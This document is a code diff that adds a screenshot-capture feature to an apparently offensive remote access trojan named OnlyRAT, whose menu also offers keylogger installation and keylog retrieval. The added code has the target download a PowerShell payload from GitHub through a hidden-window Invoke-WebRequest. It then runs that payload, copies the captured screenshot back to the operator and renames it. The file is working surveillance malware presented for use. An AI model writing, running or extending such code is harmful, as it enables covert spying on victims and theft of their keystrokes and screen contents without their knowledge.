@@ -7,6 +7,7 @@ import os
 import sys
 import getpass
 import random as r
+from datetime import datetime
 from modules import *
 
 # banner for display
@@ -38,7 +39,9 @@ options_menu = """
             [0] - Remote Console
             [1] - Install Keylogger
             [2] - Grab Keylogs
-            [3] - Restart Target PC
+            [3] - Install ScreenCapture
+            [4] - Take ScreenShot
+            [5] - Restart Target PC
 
         [+] Options:
             [h] or [help] ----- Help Menu
@@ -103,13 +106,18 @@ def exit():
     print("\n[*] Exiting...")
     sys.exit()
 
+# gets current date and time
+def current_date():
+    current = datetime.now()
+
+    return current.strftime("%m/%d/%Y_%H-%M-%S")
+
 # connects rat to target
 def connect(address, password):
     print("\n [*] Connecting to target...")
 
     # remotely connect
     os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address}")
-
 
 # remote uploads with SCP
 def remote_upload(address, password, upload, path):
@@ -156,6 +164,28 @@ def keylogger(address, password, username, working):
 
     # execute logger
     print("\n[!] Restart target computer to execute")
+
+# takes screenshot
+def take_screenshot(address, password, working):
+    # take screenshot
+    print("\n[*] Taking screenshot...")
+    screenshot = f"./{working}/SbQRViPjIq.ps1"
+    remote_command(address, password, screenshot)
+    print("[+] Screenshot taken")
+
+    # download screenshot
+    print("[*] Downloading screenshot...")
+    screenshot_location = f"{working}/cqTbMpzNLx.jpg"
+    remote_download(address, password, screenshot_location)
+    print("[+] Screenshot downloaded")
+
+    # rename screenshot to appropiate title
+    print("[*] Formatting screenshot...")
+    file_name = current_date()
+    os.system(f"mv ~/Downloads/cqTbMpzNLx.jpg ~/Downloads/{file_name}")
+    print("[+] Screenshot fromatted")
+
+    print("\n[+] Screenshot downloaded to \"~/Downloads\"\n")
 
 # update OnlyRAT
 def update():
@@ -260,8 +290,20 @@ def cli(arguments):
                 print("[+] Log file saved to \"~/Downloads\"")
                 print("[+] Log file on target has been wiped\n")
 
-            # restart target option
+            # installs screen capture option
             elif option == "3":
+                print("\n[*] Installing screen capture...")
+                install_screencaputre = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/screenshot.ps1 -OutFile {working_direcory}/SbQRViPjIq.ps1\""
+
+                remote_command(ipv4, password, install_screencaputre)
+                print("[+] ScreenCapture installed\n")
+
+            # take screenshot option
+            elif option == "4":
+                take_screenshot(ipv4, password, working_direcory)
+
+            # restart target option
+            elif option == "5":
                 remote_command(ipv4, password, "shutdown /r")
 
             # help menu
